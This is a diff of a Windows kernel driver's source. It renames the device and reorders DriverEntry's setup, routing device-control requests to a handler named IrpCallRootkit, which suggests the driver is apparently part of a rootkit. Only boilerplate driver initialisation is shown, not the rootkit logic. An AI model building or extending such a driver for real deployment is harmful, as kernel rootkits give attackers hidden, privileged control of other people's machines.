@@ -3,12 +3,24 @@
 DRIVER_INITIALIZE DriverEntry;
 DRIVER_UNLOAD DriverUnload;
 
-UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\Whatahek");
-UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\DosDevices\\Whatahek");
+UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\AAAAAmmm");
+UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\DosDevices\\AAAAAmmm");
 
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
 
-	
+
+	NTSTATUS status = STATUS_SUCCESS;
+	UNREFERENCED_PARAMETER(RegistryPath);
+
+	PDEVICE_OBJECT deviceObject = NULL;
+
+	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
+		DriverObject->MajorFunction[i] = defaultIrpHandler;
+	}
+
+	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpCallRootkit;
+
+
 	NTSTATUS ntstatus = STATUS_SUCCESS;
 	/////////////////////// THIS SECTION /////////////////////////////////////
 	UNICODE_STRING     uniName;
@@ -35,16 +47,7 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING Regi
 		NULL, 0);
 
 
-	NTSTATUS status = STATUS_SUCCESS;
-	UNREFERENCED_PARAMETER(RegistryPath);
 
-	PDEVICE_OBJECT deviceObject = NULL;
-
-	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
-		DriverObject->MajorFunction[i] = defaultIrpHandler;
-	}
-
-	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpCallRootkit;
 
 	status = IoCreateDevice(
 		DriverObject,
@@ -54,6 +57,9 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING Regi
 		FILE_DEVICE_SECURE_OPEN,
 		FALSE,
 		&deviceObject);
+
+
+
 
 	if (!NT_SUCCESS(status)) {
 		return status;
